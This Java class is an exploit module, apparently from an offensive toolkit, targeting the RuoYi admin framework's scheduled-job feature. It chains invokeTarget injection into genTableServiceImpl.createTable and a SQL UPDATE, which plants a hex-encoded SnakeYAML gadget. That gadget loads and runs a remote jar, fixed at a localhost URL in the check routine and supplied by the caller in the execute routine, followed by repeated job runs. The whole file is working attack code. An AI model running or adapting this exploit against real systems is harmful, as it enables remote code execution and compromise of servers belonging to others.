package com.ruoyi.ruoyigui.exploit;

import com.ruoyi.ruoyigui.common.BasePayload;
import com.ruoyi.ruoyigui.entity.Result;
import com.ruoyi.ruoyigui.util.CustomHttpClient;
import com.ruoyi.ruoyigui.util.Tools;

import java.util.Random;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class ruoyi_job_gentable_template implements BasePayload {
    @Override
    public Result checkVUL(String url) throws Exception {
        Random random = new Random();
        int randomNumber = 100 + random.nextInt(201);
        String vul_uri = url + "/monitor/job/add";
        String payload = "createBy=admin&jobId=" + randomNumber + "&jobName=test111&jobGroup=DEFAULT&invokeTarget=genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6f72672e79616d6c2e736e616b6579616d6c2e59616d6c2e6c6f6164282721216a617661782e7363726970742e536372697074456e67696e654d616e61676572205b21216a6176612e6e65742e55524c436c6173734c6f61646572205b5b21216a6176612e6e65742e55524c205b22687474703a2f2f3132372e302e302e312f79616d6c2d7061796c6f61642e6a6172225d5d5d5d2729 WHERE job_id = " + randomNumber + ";')&cronExpression=0%2F10+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=";
        String vul_url_run = url + "/monitor/job/run";
        String payload1 = "jobId=" + randomNumber;
        String vul_job_list = url + "/monitor/job/list";
        String vul_job_list_payload = "pageSize=10&pageNum=1&orderByColumn=createTime&isAsc=desc&jobName=&jobGroup=&status=";
        String remove_vul_effect_uri = url + "/monitor/job/remove";
        String remove_vul_effect_payload = "ids=" + randomNumber;

        try {
            CustomHttpClient req = new CustomHttpClient();
            CustomHttpClient.HttpResponse res = req.post(vul_uri, payload);
            if (res.getBody().contains("操作成功")) {
                String res1 = req.post(vul_url_run, payload1).getBody();
                if (res1.contains("操作成功")) {
                    String res2;
                    int maxRetries = 5;
                    int attempt = 0;
                    do {
                        res2 = req.post(vul_job_list, vul_job_list_payload).getBody();
                        attempt++;

                        if (attempt >= maxRetries) {
                            break;
                        }
                        TimeUnit.SECONDS.sleep(1);
                    } while (res2.contains("snakeyaml"));
                }
                req.post(remove_vul_effect_uri, remove_vul_effect_payload);
                return new Result(true, "Ruoyi job gentable template漏洞", "[Snakeyaml漏洞(bypass)]\nURI:" + vul_uri + "\nDATA:" + payload);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new Result(false, "Ruoyi job gentable template漏洞", null);
    }

    @Override
    public Result exeVUL(String url, String cmd) throws Exception {
        Random random = new Random();
        int randomNumber = 100 + random.nextInt(201);
        String vul_uri = url + "/monitor/job/add";
        String payload = "createBy=admin&jobId=" + randomNumber + "&jobName=test222&jobGroup=DEFAULT&invokeTarget=genTableServiceImpl.createTable('update sys_job set invoke_target=0x" + Tools.string2HexString("org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"" + cmd + "\"]]]]')") + " where job_id=" + randomNumber + ";')&cronExpression=0%2F10+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=";

        String vul_url_run = url + "/monitor/job/run";
        String payload1 = "jobId=" + randomNumber;

        String vul_job_list = url + "/monitor/job/list";
        String vul_job_list_payload = "pageSize=10&pageNum=1&orderByColumn=createTime&isAsc=desc&jobName=&jobGroup=&status=";

        try {
            CustomHttpClient req = new CustomHttpClient();
            String res = req.post(vul_uri, payload).getBody();
            if (res.contains("操作成功")) {
                req.post(vul_url_run, payload1);
                req.post(vul_url_run, payload1);
                req.post(vul_url_run, payload1);
                req.post(vul_url_run, payload1);
                String res1 = req.post(vul_url_run, payload1).getBody();
                if (res1.contains("操作成功")) {
                    String res2;
                    int maxRetries = 5;
                    int attempt = 0;
                    do {
                        res2 = req.post(vul_job_list, vul_job_list_payload).getBody();
                        attempt++;

                        if (attempt >= maxRetries) {
                            break;
                        }
                        TimeUnit.SECONDS.sleep(1);
                    } while (res2.contains("snakeyaml"));
                    req.post(vul_url_run, payload1);
                    req.post(vul_url_run, payload1);
                    String res3 = req.post(vul_url_run, payload1).getBody();
                    if (res3.contains("操作成功")) {
                        return new Result(true, null, "加载成功,请自行判断命令是否执行成功！(非测试环境注意删除任务)");
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new Result(false, null, null);
    }

    @Override
    public Result getShell(String url) throws Exception {
        return new Result(false, null, null);
    }
}
